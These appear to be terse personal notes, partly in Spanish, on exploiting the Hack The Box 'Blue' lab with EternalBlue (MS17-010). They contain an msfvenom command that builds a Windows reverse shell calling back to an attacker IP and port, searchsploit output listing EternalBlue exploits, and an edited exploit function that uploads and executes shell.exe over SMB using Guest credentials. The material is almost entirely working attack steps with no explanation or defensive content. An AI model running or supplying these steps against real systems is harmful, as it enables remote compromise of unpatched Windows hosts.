

https://github.com/helviojunior/MS17-010?source=post_page-----787b34da3742--------------------------------

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4242 -f exe > shell.exe


└─# searchsploit ms17-010 
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Exe | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)               | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)            | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution ( | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)  | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-01 | windows_x86-64/remote/41987.py
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                              
┌──(root㉿kali)-[~kali/Documents/htb/blue/nmap]
└─# searchsploit 42315.py
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution ( | windows/remote/42315.py
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

─# searchsploit 42315.py
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution ( | windows/remote/42315.py
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                              
┌──(root㉿kali)-[~kali/Documents/htb/blue/nmap]
└─# searchsploit -m 42315.py
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
    Codes: CVE-2017-0144
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/Documents/htb/blue/nmap/42315.py


********************

modificar el usuario 
y el arhivo exploit en el archivo

 USERNAME = 'Guest'                                                                                
 PASSWORD = ''         


def smb_pwn(conn, arch):                                                                          
     smbConn = conn.get_smbconnection()                                                            
                                                                                                   
     print('creating file c:\\pwned.txt on the target')                                            
     tid2 = smbConn.connectTree('C$')                                                              
     fid2 = smbConn.createFile(tid2, '/pwned.txt')                                                 
     smbConn.closeFile(tid2, fid2)                                                                 
     smbConn.disconnectTree(tid2)                                                                  
                                                                                                   
     smb_send_file(smbConn, '/home/kali/Documents/htb/blue/exploits/shell.exe', 'C', '/shell.exe') 
     service_exec(conn, r'cmd /c c:\shell.exe')                                                    
     # Note: there are many methods to get shell over SMB admin session                            
     # a simple method to get shell (but easily to be detected by AV) is                           
     # executing binary generated by "msfvenom -f exe-service ..."
